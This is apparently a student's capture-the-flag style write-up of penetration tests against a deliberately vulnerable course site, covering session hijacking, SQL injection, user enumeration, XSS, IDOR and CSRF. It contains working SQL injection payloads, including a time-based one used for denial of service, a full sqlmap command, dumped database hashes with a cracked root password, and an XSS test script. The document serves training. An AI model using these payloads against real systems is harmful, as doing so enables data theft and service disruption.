#  Pen Testing Live Targets

Time spent: 15 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First, discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

# Vulnerability #1: Session Hijacking

Description: 

A Session Hijacking attack is an exploit that seeks to manipulate the web session control mechanism by sending a request to a web server with an authenticated SessionID, Cookie, or a combination of both. Web servers grant a token to a client browser after authentication; said token can be used to hijack another user's session. By masquerading your browser token as the authenticated token, the web server will recognize you as an authenticated user, granting you access. 

How to document and recreate this exploit:

1. First visit https://104.198.208.81/blue/public/staff/login.php and log in using the pperson credentials. 
2. Go to https://104.198.208.81/blue/public/hacktools/change_session_id.php to see your current PHPSESSIONID, and store that information for later. 
3. Open another browser such as Firefox or Chrome, visit https://104.198.208.81/blue/public/hacktools/change_session_id.php, and copy the authenticated PHPSESSIONID to replace your Session ID. 
4. Next visit https://104.198.208.81/blue/public/login.php; you should see that you are already logged in. 
5. We successfully bypassed authentication.


![Session Hijacking Exploit](https://user-images.githubusercontent.com/111711434/200113050-d1337254-f6f5-4351-b27f-76912f7a5866.gif)


# Vulnerability #2: SQL Injections

Description: 

SQL Injections are an attack that seeks to exploit vulnerabilities in an application's input validation for SQL queries. Malicious code is injected into a query that can reveal data found in the database, such as passwords, usernames, emails, etc.  

How to document and recreate this exploit:

1. First visit https://104.198.208.81/blue/public/staff/login.php and log in using the pperson credentials. 
2. Then head on over to URL https://104.198.208.81/blue/public/salesperson.php?id=1 
3. Using BurpSuite, GET request file as a TXT file. We will feed this information to a tool called SQLMap with the following parameter: sqlmap -r /home/kali/sqlmal-dev/request.txt -a (the -a parameter will return EVERYTHING, at times not recommended)
4. SQLMap detects a vulnerability in the 'id=' field and provides us with three SQL injections:
	
   * Parameter: id (GET)
     * Type: boolean-based blind
     * Title: AND boolean-based blind - WHERE or HAVING clause
     * Payload: id=3' AND 2971=2971 AND 'bcTH'='bcTH
    
    Comments after testing: Returned the information for User Irene Boling; see below:
   
   
  * Irene Boling
  * 555-736-2301
  * iboling@salesperson.com

   
   
   * Type: time-based blind
   * Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
   * Payload: id=3' AND (SELECT 8396 FROM (SELECT(SLEEP(5)))PBWw) AND 'pCMl'='pCMl 
   
   
     Comments after testing: Changed (SLEEP(5))))PBWw) to SLEEP(200000))))PBWw, and it created a Denial of Service for the time set. 
   ![Denial of Service after SQL injection  ](https://user-images.githubusercontent.com/111711434/200140448-3da3ba36-f3b6-4bcf-a079-b24d6592906c.png)

   * Type: UNION query
   - Title: Generic UNION query (NULL) - 5 columns
   - Payload: id=-8495' UNION ALL SELECT  CONCAT(0x716b766a71,0x6b544944475a6778655979637a6558776b595163416a567459494a735864556b4f55666875547352,0x7171717a71),NULL,NULL,NULL,NULL-- -


Comments after testing: Redirects to the 'Find a Salesperson' web page.

The scan revelead the following information that can further assist us:
* Web Server OS : Linux Ubuntu 16.04 or 16.10
* Web App Technology: Apache 2.4.18 server
* MySQL version: 5.0.12

Databases:  

* [INFO] fetching database names
* [INFO] resumed: 'globitek_blue'
* [INFO] resumed: 'information_schema'
* [INFO] resumed: 'globitek_blue'
* [INFO] resumed: 'globitek_green'
* [INFO] resumed: 'globitek_red'
* [INFO] resumed: 'mysql'
* [INFO] resumed: 'performance_schema'
* [INFO] resumed: 'sys'



Database management users:                                                                                                                                                                                                     
* 'debian-sys-maint'@'localhost'
* 'mysql.session'@'localhost'
* 'mysql.sys'@'localhost'
* 'root'@'localhost'


Moreover, SQLMap also located & revealed the following password hashes:

[INFO] fetching database users password hashes
  
[INFO] resumed: 'mysql.sys','*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'

[INFO] resumed: 'debian-sys-maint','*7B88B3A98617F2ED6B4EB4F48AEAD4E1416C359C'

[INFO] resumed: 'mysql.session','*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'





Using the integrated dictionary-based password cracker (mysql_passwd), the password for root was found:

database management system users password hashes:                                                                                                                               


* debian-sys-maint [1]: password hash: *7B88B3A98617F2ED6B4EB4F48AEAD4E1416C359C
* mysql.session [1]: password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
* mysql.sys [1]: password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
* root [1]: password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
*                            clear-text password: password




## Green

# Vulnerability #1: User Enumaration 

Description:

User enumeration is a method of discovering users on a database by analyzing the errors returned at a login prompt. An example would be entering credentials and the error displaying as "Unknown user" but trying different credentials and getting a "Password Incorrect or password does not match", which confirms that the user exists in the system. We can then work towards obtaining their password credentials through other means.

How to document and recreate this exploit:

1. Visit https://104.198.208.81/green/public/staff/login.php
2. Attempt to log on with a random username & password; you will notice that the error returns as "Login was unsuccessful." However, upon attempting to enter a known user, such as pperson with a wrong password, the same error returned but in bold(different CSS class), confirming the user exists in the database. 


![User Enumeration ](https://user-images.githubusercontent.com/111711434/200143718-b1ebb1ae-5fd7-4d2f-a9ee-1dfd6b6dd1f6.gif)



# Vulnerability #2: Cross Site Scripting (XSS) 

Description: 

Cross-Site Scripting(XSS) is an exploit in which a script can be executed via a web browser on behalf of the web application. The effects of XSS can result in account compromise, deletion, privilege escalation, malware infection, and more.  

Source: https://www.geeksforgeeks.org/what-is-cross-site-scripting-xss/

How to document and recreate this exploit:

1. Visit https://104.198.208.81/green/public/
2. Go to https://104.198.208.81/green/public/contact.php; the 'Contact' form is a possible injection point.
   ![image](https://user-images.githubusercontent.com/111711434/200144285-d3869f55-8a9f-479e-911b-a2b0b612a750.png)
     
3. Fill out the fields:
  * Name: Test
  * Email: test@yahoo.com
  * Feedback: <script>alert('In plain sight.');</script  (this is a blind XSS script test) 
4. Hit submit.
5. Log in using the pperson credentials.
6. Head to the Feedback section.
7. We confirmed that the site is vulnerable to XSS. 

![Green XSS](https://user-images.githubusercontent.com/111711434/200143880-9a29cfb5-4871-464d-9bca-4545b404deeb.gif)



## Red

# Vulnerability #1: Insecure Direct Object Reference (IDOR)

	
Description: 

Insecure Direct Object References are a type of vulnerability in which user-supplied input can be used to access data directly, such as (id?=, uid=, pid, etc). If access control is not configured correctly, users can see across other pages by changing the value of the ‘id=’. 

How to document and recreate this exploit:
	
1. Visit https://104.198.208.81/red/public/index.php
2. Head over to https://104.198.208.81/red/public/territories.php and click on any user of interest, in this case I picked bobby (https://104.198.208.81/red/public/salesperson.php?id=1) 
3. Preliminary testing indicates that salesperson.php?id= may be vulnerable. 
 * Tested various values in the ID= field of the URL
 * ID=10 revealed information about 
   Testy McTesterson, and user that is not supposed to be public until September 1st. 
   ![image](https://user-images.githubusercontent.com/111711434/200144425-b4fa5ff2-4ff8-41f7-80bf-95b876e7d9cc.png)
 
	

	
* ID=11 revelead information on Lazy Lazyman, an employee that was fired.
  ![image](https://user-images.githubusercontent.com/111711434/200144538-ad5dce27-82e2-43c7-bca9-d066dccad206.png)

	
	
	
# Vulnerability #2: Cross-Site Request Forgery

Description: 

CSRF is an attack that preys on social engineering to execute HTML code to perform malicious actions on an authenticated user. The attack surface of CSRF spans from changing usernames to emails, passwords, and any other action allowed by the user on the site. 
	
	

https://www.geeksforgeeks.org/what-is-cross-site-request-forgery-csrf/
	
How to document and recreate this exploit:	
	
Upon inspection of the HTML form at URL https://35.184.88.145/red/public/staff/salespeople/edit.php?id=1, I noticed that the site accepts any value for the CSRF token. This allowed for the following HTML page to be created to perform a Cross-Site Request Forgery attack to edit the user's details. 

![image](https://user-images.githubusercontent.com/111711434/200218318-aa40edc9-f51e-4789-a154-83c5181e0f09.png)

Demonstration:
![red csrf](https://user-images.githubusercontent.com/111711434/200218427-05666440-daf7-43ac-b9d3-2eabca1fa70c.gif)


## Notes
```
Sources utilized:
1. https://www.geeksforgeeks.org/sql-injection-cheat-sheet/
2. https://www.sqlinjection.net/union/
3. https://github.com/payloadbox/sql-injection-payload-list
4. https://owasp.org/www-community/attacks/Session_hijacking_attack
5. https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
6. https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

